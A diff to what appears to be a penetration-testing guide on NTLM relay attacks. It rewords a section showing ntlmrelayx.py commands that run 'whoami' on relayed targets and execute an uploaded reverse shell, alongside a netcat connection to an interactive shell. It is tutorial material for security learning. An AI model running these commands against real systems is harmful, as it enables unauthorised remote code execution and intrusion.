@@ -74,9 +74,10 @@ syntax: `ntlmrelayx.py -tf targets.txt -smb2support -i`
 
 ![image](https://user-images.githubusercontent.com/76034874/187008783-7a4a8830-4796-495e-b1a1-8efafd69e439.png)
 
-#### Now we start a netcat listener in another terminal on our attack box at 127.0.0.1 11002 and we open up to a shell. Type 'help' to see a list of commands.  We can upload or download files with `get` and `put`.  We could run most windows commands in the ntlmrelay command line or upload our own reverse shell. For example:
-Syntax: `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
-`ntlmrelayx.py -tf targets.txt -smb2support -e "shell.exe"`
+#### Now we start netcat in another terminal on our attack box to connect to 127.0.0.1 port 11002 and we open up to a web shell. Type 'help' to see a list of commands.  We can upload or download files with `get` and `put`.  We can run most windows commands in the ntlmrelay command line or upload our own reverse shell. For example:
+Syntax for a single windows command: `ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`
+
+Syntax to execute an uploaded reverse shell: `ntlmrelayx.py -tf targets.txt -smb2support -e "shell.exe"`
 ***Used with msfconsole and msfvenom***
 
 ![image](https://user-images.githubusercontent.com/76034874/187009309-f8dca5d0-8da0-4e4f-a705-6d289d1bae30.png)
